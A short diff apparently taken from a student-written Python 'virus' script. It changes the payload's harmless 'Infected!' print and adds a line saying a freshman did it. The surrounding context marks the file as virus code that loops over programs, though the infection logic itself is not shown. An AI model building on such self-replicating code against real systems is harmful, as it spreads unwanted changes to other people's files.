@@ -38,6 +38,7 @@ for prog in progs:
          fh.close()
 
 # Opyional Payload
-print("Infected!")
+print("Infected!!!!!!")
+print("A freshman did this")
 
 ##### VIRUS END #####
